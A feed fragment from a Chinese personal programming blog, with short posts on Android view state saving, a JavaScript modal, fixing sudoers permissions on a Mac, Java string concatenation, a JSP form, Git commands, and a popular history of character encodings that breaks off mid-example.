class="keyword">if</span> (!(state <span class="keyword">instanceof</span> SavedState)) &#123;</span><br><span class="line"><span class="keyword">super</span>.onRestoreInstanceState(state);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// it is our state</span></span><br><span class="line">SavedState ss = (SavedState) state;</span><br><span class="line"><span class="comment">// Peel it and give the child to the super class</span></span><br><span class="line"><span class="keyword">super</span>.onRestoreInstanceState(ss.getSuperState());</span><br><span class="line"><span class="comment">// this.fromDate = ss.fromDate;</span></span><br><span class="line"><span class="comment">// this.toDate= ss.toDate;</span></span><br><span class="line"><span class="keyword">this</span>.setFromDate(ss.fromDate);</span><br><span class="line"><span class="keyword">this</span>.setToDate(ss.toDate);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Parcelable <span class="title">onSaveInstanceState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Log.d(tag, <span class="string">"in onSaveInstanceState"</span>);</span><br><span class="line">Parcelable superState = <span class="keyword">super</span>.onSaveInstanceState();</span><br><span class="line">SavedState ss = <span class="keyword">new</span> SavedState(superState);</span><br><span class="line">ss.fromDate = <span class="keyword">this</span>.fromDate;</span><br><span class="line">ss.toDate = <span class="keyword">this</span>.toDate;</span><br><span class="line"><span class="keyword">return</span> ss;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SavedState</span> <span class="keyword">extends</span> <span class="title">BaseSavedState</span> </span>&#123;</span><br><span class="line"><span class="comment">// null values are allowed</span></span><br><span class="line"><span class="keyword">private</span> Calendar fromDate;</span><br><span class="line"><span class="keyword">private</span> Calendar toDate;</span><br><span class="line"></span><br><span class="line">SavedState(Parcelable superState) &#123;</span><br><span class="line"><span class="keyword">super</span>(superState);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SavedState(Parcelable superState, Calendar inFromDate, Calendar inToDate) &#123;</span><br><span class="line"><span class="keyword">super</span>(superState);</span><br><span class="line">fromDate = inFromDate;</span><br><span class="line">toDate = inToDate;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeToParcel</span><span class="params">(Parcel out, <span class="keyword">int</span> flags)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>.writeToParcel(out, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fromDate != <span class="keyword">null</span>) &#123;</span><br><span class="line">out.writeLong(fromDate.getTimeInMillis());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">out.writeLong(-<span class="number">1L</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (fromDate != <span class="keyword">null</span>) &#123;</span><br><span class="line">out.writeLong(toDate.getTimeInMillis());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">out.writeLong(-<span class="number">1L</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="string">"fromDate:"</span></span><br><span class="line">+ DurationControl.getDateString(fromDate));</span><br><span class="line">sb.append(<span class="string">"fromDate:"</span> + DurationControl.getDateString(toDate));</span><br><span class="line"><span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"hiding"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Parcelable.Creator&lt;SavedState&gt; CREATOR </span><br><span class="line">   = <span class="keyword">new</span> Parcelable.Creator&lt;SavedState&gt;() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> SavedState <span class="title">createFromParcel</span><span class="params">(Parcel in)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> SavedState(in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> SavedState[] newArray(<span class="keyword">int</span> size) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> SavedState[size];</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read back the values</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">SavedState</span><span class="params">(Parcel in)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>(in);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read the from date</span></span><br><span class="line"><span class="keyword">long</span> lFromDate = in.readLong();</span><br><span class="line"><span class="keyword">if</span> (lFromDate == -<span class="number">1</span>) &#123;</span><br><span class="line">fromDate = <span class="keyword">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fromDate = Calendar.getInstance();</span><br><span class="line">fromDate.setTimeInMillis(lFromDate);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Read the from date</span></span><br><span class="line"><span class="keyword">long</span> lToDate = in.readLong();</span><br><span class="line"><span class="keyword">if</span> (lFromDate == -<span class="number">1</span>) &#123;</span><br><span class="line">toDate = <span class="keyword">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">toDate = Calendar.getInstance();</span><br><span class="line">toDate.setTimeInMillis(lToDate);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="comment">// eof-state-class</span></span><br></pre>        </td>      </tr>    </table>  </figure></p><p><em>其实这就相当于把整个组合控件当成一个View来管理</em></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/db293350/">http://home.meng.uno/articles/db293350/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      概论：
 1. 说在前面的话
 2. 继承框架提供的布局
 3. 布局文件
 4. 构造方法
 5. 状态保存

说在前面的话
自定义组合控件还是蛮简单的，你不用measure，layout，draw，当然你想的话也可以在组合控件上做这些操作的，不过大多数时候是没有必要的。组合控件的自定义属性和自定义view完全一样，这里比较难的是状态保存，因为一个页面可以有很多个你自定义的组合控件，但是系统的状态保存是依赖viewID的，所以你不能让ViewGroup来管理你的控件状态，只能自己管理了。当然，你也可能不需要状态保存，那就很简单了。

下面说说需要经历的步骤吧：

 * 让自定义的组合控件继承
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="Android" scheme="http://home.meng.uno/tags/Android/"/>
    
      <category term="customView" scheme="http://home.meng.uno/tags/customView/"/>
    
      <category term="自定义控件" scheme="http://home.meng.uno/tags/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8E%A7%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Java web中的浮出层使用</title>
    <link href="http://home.meng.uno/articles/fa7b6881/"/>
    <id>http://home.meng.uno/articles/fa7b6881/</id>
    <published>2016-11-23T05:30:45.000Z</published>
    <updated>2020-12-02T01:42:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>进行<a href="https://github.com/HITAmigos/WebDataExtraction/" target="_blank" rel="noopener">《软件工程》大项目</a>时，遇到想在主页上仿Google首页上的那种“一个输入框+两个按钮”，同时一个按钮搜索、一个按钮上传文件，于是到网上查了好久，都没有关于“一个按钮实现文件上传”的功能介绍，最后只能使用“通过一个浮出层弹出上传文件”这种方式，下面贴出JavaScript代码。</p><p>在按钮中使用时只需要这样使用就行：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;<span class="selector-tag">a</span> href=<span class="string">"javascript:_iframe() %&gt;')"</span> class=<span class="string">"button"</span>&gt;点击进入我的博客&lt;/a&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>JavaScript代码如下：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;script&gt;</span><br><span class="line">    function _iframe() &#123;</span><br><span class="line">        zeroModal.show(&#123;</span><br><span class="line">            title: <span class="string">'我的博客'</span>,</span><br><span class="line">            <span class="selector-tag">iframe</span>: true,</span><br><span class="line">            url: <span class="string">'http://www.meng.uno'</span>,</span><br><span class="line">            <span class="attribute">width</span>: <span class="string">'60%'</span>,</span><br><span class="line">            <span class="attribute">height</span>: <span class="string">'60%'</span>,</span><br><span class="line">            cancel: true</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"> &lt;/script&gt;</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/fa7b6881/">http://home.meng.uno/articles/fa7b6881/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      进行《软件工程》大项目时，遇到想在主页上仿Google首页上的那种“一个输入框+两个按钮”，同时一个按钮搜索、一个按钮上传文件，于是到网上查了好久，都没有关于“一个按钮实现文件上传”的功能介绍，最后只能使用“通过一个浮出层弹出上传文件”这种方式，下面贴出JavaScript代码。

在按钮中使用时只需要这样使用就行：

1


&lt;a href=&quot;javascript:_iframe() %&gt;&#39;)&quot; class=&quot;button&quot;&gt;点击进入我的博客&lt;/a&gt;


JavaScript代码如下：

1
2
3
4
5
6
7
8
9
10
11
12


&lt;script&gt;
    function _
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="浮出层" scheme="http://home.meng.uno/tags/%E6%B5%AE%E5%87%BA%E5%B1%82/"/>
    
  </entry>
  
  <entry>
    <title>Mac sudo命令无法使用</title>
    <link href="http://home.meng.uno/articles/e3b9b515/"/>
    <id>http://home.meng.uno/articles/e3b9b515/</id>
    <published>2016-11-19T03:29:25.000Z</published>
    <updated>2020-12-02T02:06:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>在之前好长一段时间，不知道因为我改动了哪个文件的权限，导致sudo命令无法使用，每次启动sudo总会报什么权限不对的错误，在网上找了好久都没找到解决办法，包括stackoverflow这么牛逼哄哄的网站上面问题人采纳的方案都无济于事，今天闲来无事，又想解决这个问题，这次我是直接进苹果的“Mac 支持”上看的，发现Mac有个<a href="https://support.apple.com/zh-cn/HT201573" target="_blank" rel="noopener"><code>单用户模式</code></a>（在此给出连接），我进入单用户模式，然后就是一个黑框框，在里面输入以下几条命令：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">mount -uw /</span><br><span class="line">chown root:wheel /etc/sudoers</span><br><span class="line">chmod <span class="number">440</span> /etc/sudoers</span><br></pre>      </td>    </tr>  </table></figure><p>大致就是恢复文件权限之类的吧，结果<code>reboot</code>之后，居然就好了😝。 特此记录以下，给出现同种问题的小伙伴提供下。 其实，我的MySQL也有问题，我正准备进MySQL官网看看有什么解决办法😂，所以说，有什么事，能看懂英文的，尽量去软件官网找解决办法！！</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/e3b9b515/">http://home.meng.uno/articles/e3b9b515/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      在之前好长一段时间，不知道因为我改动了哪个文件的权限，导致sudo命令无法使用，每次启动sudo总会报什么权限不对的错误，在网上找了好久都没找到解决办法，包括stackoverflow这么牛逼哄哄的网站上面问题人采纳的方案都无济于事，今天闲来无事，又想解决这个问题，这次我是直接进苹果的“Mac 支持”上看的，发现Mac有个单用户模式（在此给出连接），我进入单用户模式，然后就是一个黑框框，在里面输入以下几条命令：

1
2
3


mount -uw /
chown root:wheel /etc/sudoers
chmod 440 /etc/sudoers


大致就是恢复文件权限之类的吧，结
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="sudo" scheme="http://home.meng.uno/tags/sudo/"/>
    
  </entry>
  
  <entry>
    <title>String的“+”操作分析</title>
    <link href="http://home.meng.uno/articles/fc57b387/"/>
    <id>http://home.meng.uno/articles/fc57b387/</id>
    <published>2016-11-01T08:39:36.000Z</published>
    <updated>2020-12-02T02:06:01.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起源">起源</h2><p>昨天，我和队友讨论字符串拼接问题时，他提到了这个问题：直接“+”操作好像是生成了临时的一个新String，然后拼接，再复制给原来的String。带着这个问题，我查了下，得出以下的结论。</p><h2 id="结论">结论</h2><p>我查到的信息之一这样说：因为“+”拼接字符串，每拼接一次都是再内存重新开辟一个新的内存区域（堆里边）,然后把得到的新的字符串存在这块内存，字符串如果很大，循环次多又多，那么浪费了很多时间和空间的开销。 我查到的信息之二这么说：当拼接次数较少时，其实编译器会将其优化为StringBuilder类型，只是当拼接次数特别多时，编译器优化时将会产生过多的StringBuilder类型，从而导致空间浪费。</p><h2 id="策略">策略</h2><p>当拼接次数较少时，我们可以直接使用“+”操作，而当拼接数量较大时，我们最好使用StringBuilder类型。</p><h2 id="操作">操作</h2><figure class="highlight">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">StringBuilder SB = new StringBuilder();</span><br><span class="line">SB.append(……);</span><br><span class="line">String Result = SB.toString();</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/fc57b387/">http://home.meng.uno/articles/fc57b387/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      起源
昨天，我和队友讨论字符串拼接问题时，他提到了这个问题：直接“+”操作好像是生成了临时的一个新String，然后拼接，再复制给原来的String。带着这个问题，我查了下，得出以下的结论。

结论
我查到的信息之一这样说：因为“+”拼接字符串，每拼接一次都是再内存重新开辟一个新的内存区域（堆里边）,然后把得到的新的字符串存在这块内存，字符串如果很大，循环次多又多，那么浪费了很多时间和空间的开销。 我查到的信息之二这么说：当拼接次数较少时，其实编译器会将其优化为StringBuilder类型，只是当拼接次数特别多时，编译器优化时将会产生过多的StringBuilder类型，从而导致空间浪费。

    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="String" scheme="http://home.meng.uno/tags/String/"/>
    
      <category term="+" scheme="http://home.meng.uno/tags//"/>
    
  </entry>
  
  <entry>
    <title>将多个input合并成一个字符串提交给后台</title>
    <link href="http://home.meng.uno/articles/f12d3e70/"/>
    <id>http://home.meng.uno/articles/f12d3e70/</id>
    <published>2016-10-29T04:50:24.000Z</published>
    <updated>2020-12-02T01:49:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="需求">需求</h2><p>我在做我们的《软件工程》作业时，遇到了这样一个问题：我们需要打开一个表，这个表的列数不确定，但要增加增加行的操作。</p><h2 id="实现">实现</h2><p>于是，需求产生了，我需要将前端的多个input标签内容合并成一个字符串来进行提交，我看了几个比较牛的方法（json、ognl……）但是好像与我们的需求偏的有点远（如果可以实现，欢迎留言），最后，没办法只能自己想，由于我还是会一点JavaScript的，所以我就想用JavaScript实现，在尝试了很多次之后，终于成功了，在此先贴上代码。</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">function n(n)&#123;</span><br><span class="line">var num="";</span><br><span class="line">for(var i=0;i&lt;n;i++)&#123;</span><br><span class="line">    num += document.getElementById("num"+i).value;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById("result").value = num;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  int num=3;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;<span class="selector-tag">form</span>  action=<span class="string">"addAction"</span>&gt;</span><br><span class="line">&lt;input id="num"  name="num" value=&lt;%=num %&gt; type="text"&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  for(int i=0;i&lt;num;i++)&#123;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;<span class="selector-tag">input</span> id=<span class="string">"num&lt;%=i %&gt;"</span> type=<span class="string">"text"</span> onblur=<span class="string">"n(&lt;%=num%&gt;)"</span>&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;<span class="selector-tag">input</span>  name=<span class="string">"str"</span> id=<span class="string">"result"</span> type=<span class="string">"hidden"</span> &gt;</span><br><span class="line">&lt;<span class="selector-tag">button</span> &gt;提交&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析">分析</h2><p>最后来分析，到底是怎么实现的，其实道理特别简单，就是JavaScript获取input的个数，然后一个循环，将所有input合并，并且给到一个“hidden”的input里，在后台接收这个input就可以了。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/f12d3e70/">http://home.meng.uno/articles/f12d3e70/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      需求
我在做我们的《软件工程》作业时，遇到了这样一个问题：我们需要打开一个表，这个表的列数不确定，但要增加增加行的操作。

实现
于是，需求产生了，我需要将前端的多个input标签内容合并成一个字符串来进行提交，我看了几个比较牛的方法（json、ognl……）但是好像与我们的需求偏的有点远（如果可以实现，欢迎留言），最后，没办法只能自己想，由于我还是会一点JavaScript的，所以我就想用JavaScript实现，在尝试了很多次之后，终于成功了，在此先贴上代码。

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24


    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="软件工程" scheme="http://home.meng.uno/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Git学习小结</title>
    <link href="http://home.meng.uno/articles/5850713f/"/>
    <id>http://home.meng.uno/articles/5850713f/</id>
    <published>2016-10-21T07:50:24.000Z</published>
    <updated>2020-12-02T01:44:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1>从Git官方教程出发</h1><p>进入git教程官网我们可以发现，主要从这几个方面来讲解的（几乎所有你能搜到的博客都是这么一成不变！）：</p><h2 id="建立项目">建立项目</h2><ol>  <li>init</li>  <li>clone</li></ol><h2 id="基本操作">基本操作</h2><ol start="3">  <li>add</li>  <li>status</li>  <li>diff</li>  <li>commit</li>  <li>reset</li>  <li>rm</li>  <li>mv</li></ol><h2 id="分支管理">分支管理</h2><ol start="10">  <li>branch</li>  <li>checkout</li>  <li>merge</li>  <li>mergetool</li>  <li>log</li>  <li>stash</li>  <li>tag</li></ol><h2 id="分享与更新">分享与更新</h2><ol start="17">  <li>fetch</li>  <li>pull</li>  <li>push</li>  <li>remote</li>  <li>submodule</li></ol><p>看到这里，我们基本的git学习就可以结束了，要问为什么我只写标题而不写内容，我只想说，我写这篇博客只是为了通过自己写一遍命令来复习一遍而已。😝</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/5850713f/">http://home.meng.uno/articles/5850713f/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      从Git官方教程出发
进入git教程官网我们可以发现，主要从这几个方面来讲解的（几乎所有你能搜到的博客都是这么一成不变！）：

建立项目
 1. init
 2. clone

基本操作
 3. add
 4. status
 5. diff
 6. commit
 7. reset
 8. rm
 9. mv

分支管理
 10. branch
 11. checkout
 12. merge
 13. mergetool
 14. log
 15. stash
 16. tag

分享与更新
 17. fetch
 18. pull
 19. push
 20. remote
 21. s
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="软件工程" scheme="http://home.meng.uno/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
      <category term="Git" scheme="http://home.meng.uno/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Unicode和UTF-8的区别</title>
    <link href="http://home.meng.uno/articles/97858b96/"/>
    <id>http://home.meng.uno/articles/97858b96/</id>
    <published>2016-10-21T04:50:24.000Z</published>
    <updated>2020-12-02T02:09:13.000Z</updated>
    
    <content type="html"><![CDATA[<p>很久很久以前，有一群人，他们决定用8个可以开合的晶体管来组合成不同的状态，以表示世界上的万物。他们看到8个开关状态是好的，于是他们把这称为&quot;字节&quot;。</p><p>再后来，他们又做了一些可以处理这些字节的机器，机器开动了，可以用字节来组合出很多状态，状态开始变来变去。他们看到这样是好的，于是它们就这机器称为&quot;计算机&quot;。</p><p>开始计算机只在美国用。八位的字节一共可以组合出256(2的8次方)种不同的状态。</p><p>他们把其中的编号从0开始的32种状态分别规定了特殊的用途，一但终端、打印机遇上约定好的这些字节被传过来时，就要做一些约定的动作。遇上00x10, 终端就换行，遇上0x07, 终端就向人们嘟嘟叫，例好遇上0x1b, 打印机就打印反白的字，或者终端就用彩色显示字母。他们看到这样很好，于是就把这些0x20以下的字节状态称为&quot;控制码&quot;。</p><p>他们又把所有的空格、标点符号、数字、大小写字母分别用连续的字节状态表示，一直编到了第127号，这样计算机就可以用不同字节来存储英语的文字了。大家看到这样，都感觉很好，于是大家都把这个方案叫做 ANSI 的&quot;Ascii&quot;编码（American Standard Code for Information Interchange，美国信息互换标准代码）。当时世界上所有的计算机都用同样的ASCII方案来保存英文文字。</p><p>后来，就像建造巴比伦塔一样，世界各地的都开始使用计算机，但是很多国家用的不是英文，他们的字母里有许多是ASCII里没有的，为了可以在计算机保存他们的文字，他们决定采用127号之后的空位来表示这些新的字母、符号，还加入了很多画表格时需要用下到的横线、竖线、交叉等形状，一直把序号编到了最后一个状态255。从128到255这一页的字符集被称&quot;扩展字符集&quot;。从此之后，贪婪的人类再没有新的状态可以用了，美帝国主义可能没有想到还有第三世界国家的人们也希望可以用到计算机吧！</p><p>等中国人们得到计算机时，已经没有可以利用的字节状态来表示汉字，况且有6000多个常用汉字需要保存呢。但是这难不倒智慧的中国人民，我们不客气地把那些127号之后的奇异符号们直接取消掉, 规定：一个小于127的字符的意义与原来相同，但两个大</p><p>于127的字符连在一起时，就表示一个汉字，前面的一个字节（他称之为高字节）从0xA1用到0xF7，后面一个字节（低字节）从0xA1到0xFE，这样我们就可以组合出大约7000多个简体汉字了。在这些编码里，我们还把数学符号、罗马希腊的字母、日文的假名们都编进去了，连在 ASCII 里本来就有的数字、标点、字母都统统重新编了两个字节长的编码，这就是常说的&quot;全角&quot;字符，而原来在127号以下的那些就叫&quot;半角&quot;字符了。</p><p>中国人民看到这样很不错，于是就把这种汉字方案叫做 “GB2312”。GB2312 是对 ASCII 的中文扩展。</p><p>但是中国的汉字太多了，我们很快就就发现有许多人的人名没有办法在这里打出来，特别是某些很会麻烦别人的国家领导人。于是我们不得不继续把 GB2312 没有用到的码位找出来老实不客气地用上。</p><p>后来还是不够用，于是干脆不再要求低字节一定是127号之后的内码，只要第一个字节是大于127就固定表示这是一个汉字的开始，不管后面跟的是不是扩展字符集里的内容。结果扩展之后的编码方案被称为 GBK 标准，GBK 包括了 GB2312 的所有内容，同时又增加了近20000个新的汉字（包括繁体字）和符号。</p><p>后来少数民族也要用电脑了，于是我们再扩展，又加了几千个新的少数民族的字，GBK 扩成了 GB18030。从此之后，中华民族的文化就可以在计算机时代中传承了。</p><p>中国的程序员们看到这一系列汉字编码的标准是好的，于是通称他们叫做 “DBCS”（Double Byte Charecter Set 双字节字符集）。在DBCS系列标准里，最大的特点是两字节长的汉字字符和一字节长的英文字符并存于同一套编码方案里，因此他们写的程序为了支持中文处理，必须要注意字串里的每一个字节的值，如果这个值是大于127的，那么就认为一个双字节字符集里的字符出现了。那时候凡是受过加持，会编程的计算机僧侣们都要每天念下面这个咒语数百遍：</p><p>“一个汉字算两个英文字符！一个汉字算两个英文字符……”</p><p>因为当时各个国家都像中国这样搞出一套自己的编码标准，结果互相之间谁也不懂谁的编码，谁也不支持别人的编码，连大陆和台湾这样只相隔了150海里，使用着同一种语言的兄弟地区，也分别采用了不同的 DBCS 编码方案——当时的中国人想让电脑显示汉字，就必须装上一个&quot;汉字系统&quot;，专门用来处理汉字的显示、输入的问题，但是那个台湾的愚昧封建人士写的算命程序就必须加装另一套支持 BIG5 编码的什么&quot;倚天汉字系统&quot;才可以用，装错了字符系统，显示就会乱了套！这怎么办？而且世界民族之林中还有那些一时用不上电脑的穷苦人民，他们的文字又怎么办？</p><p>真是计算机的巴比</p><p>伦塔命题啊！</p><p>正在这时，大天使加百列及时出现了——一个叫 ISO （国际标谁化组织）的国际组织决定着手解决这个问题。他们采用的方法很简单：废了所有的地区性编码方案，重新搞一个包括了地球上所有文化、所有字母和符号的编码！他们打算叫它&quot;Universal Multiple-Octet Coded Character Set&quot;，简称 UCS, 俗称 “UNICODE”。</p><p>UNICODE 开始制订时，计算机的存储器容量极大地发展了，空间再也不成为问题了。于是 ISO 就直接规定必须用两个字节，也就是16位来统一表示所有的字符，对于ascii里的那些“半角”字符，UNICODE 包持其原编码不变，只是将其长度由原来的8位扩展为16位，而其他文化和语言的字符则全部重新统一编码。由于&quot;半角&quot;英文符号只需要用到低8位，所以其高8位永远是0，因此这种大气的方案在保存英文文本时会多浪费一倍的空间。</p><p>这时候，从旧社会里走过来的程序员开始发现一个奇怪的现象：他们的strlen函数靠不住了，一个汉字不再是相当于两个字符了，而是一个！是的，从 UNICODE 开始，无论是半角的英文字母，还是全角的汉字，它们都是统一的&quot;一个字符&quot;！同时，也都是统一的&quot;两个字节&quot;，请注意&quot;字符&quot;和&quot;字节&quot;两个术语的不同，“字节”是一个8位的物理存贮单元，而“字符”则是一个文化相关的符号。在UNICODE 中，一个字符就是两个字节。一个汉字算两个英文字符的时代已经快过去了。</p><p>从前多种字符集存在时，那些做多语言软件的公司遇上过很大麻烦，他们为了在不同的国家销售同一套软件，就不得不在区域化软件时也加持那个双字节字符集咒语，不仅要处处小心不要搞错，还要把软件中的文字在不同的字符集中转来转去。UNICODE 对于他们来说是一个很好的一揽子解决方案，于是从 Windows NT 开始，MS 趁机把它们的操作系统改了一遍，把所有的核心代码都改成了用 UNICODE 方式工作的版本，从这时开始，WINDOWS 系统终于无需要加装各种本土语言系统，就可以显示全世界上所有文化的字符了。</p><p>但是，UNICODE 在制订时没有考虑与任何一种现有的编码方案保持兼容，这使得 GBK 与UNICODE 在汉字的内码编排上完全是不一样的，没有一种简单的算术方法可以把文本内容从UNICODE编码和另一种编码进行转换，这种转换必须通过查表来进行。</p><p>如前所述，UNICODE 是用两个字节来表示为一个字符，他总共可以组合出65535不同的字符，这大概已经可以覆盖世界上所有文化的符号。如果还不够也没有关系，ISO已经准备了UCS-4方案，说简单了就是四个字节来表示一个字符，这样我们就可以组合出21亿个不同的字符出来（最高位有其他用途），这大概可以用到银</p><p>河联邦成立那一天吧！</p><p>UNICODE 来到时，一起到来的还有计算机网络的兴起，UNICODE 如何在网络上传输也是一个必须考虑的问题，于是面向传输的众多 UTF（UCS Transfer Format）标准出现了，顾名思义，UTF8就是每次8个位传输数据，而UTF16就是每次16个位，只不过为了传输时的可靠性，从UNICODE到UTF时并不是直接的对应，而是要过一些算法和规则来转换。</p><p>受到过网络编程加持的计算机僧侣们都知道，在网络里传递信息时有一个很重要的问题，就是对于数据高低位的解读方式，一些计算机是采用低位先发送的方法，例如我们PC机采用的 INTEL 架构，而另一些是采用高位先发送的方式，在网络中交换数据时，为了核对双方对于高低位的认识是否是一致的，采用了一种很简便的方法，就是在文本流的开始时向对方发送一个标志符——如果之后的文本是高位在位，那就发送&quot;FEFF&quot;，反之，则发送&quot;FFFE&quot;。不信你可以用二进制方式打开一个UTF-X格式的文件，看看开头两个字节是不是这两个字节？</p><p>讲到这里，我们再顺便说说一个很著名的奇怪现象：当你在 windows 的记事本里新建一个文件，输入&quot;联通&quot;两个字之后，保存，关闭，然后再次打开，你会发现这两个字已经消失了，代之的是几个乱码！呵呵，有人说这就是联通之所以拼不过移动的原因。</p><p>其实这是因为GB2312编码与UTF8编码产生了编码冲撞的原因。</p><p>从网上引来一段从UNICODE到UTF8的转换规则：</p><p>Unicode</p><p>UTF-8</p><p>0000 - 007F</p><p>0xxxxxxx</p><p>0080 - 07FF</p><p>110xxxxx 10xxxxxx</p><p>0800 - FFFF</p><p>1110xxxx 10xxxxxx 10xxxxxx</p><p>例如&quot;汉&quot;字的Unicode编码是6C49。6C49在0800-FFFF之间，所以要用3字节模板：1110xxxx 10xxxxxx 10xxxxxx。将6C49写成二进制是：0110 1100 0100 1001，将这个比特流按三字节模板的分段方法分为0110 110001 001001，依次代替模板中的x，得到：1110-0110 10-110001 10-001001，即E6 B1 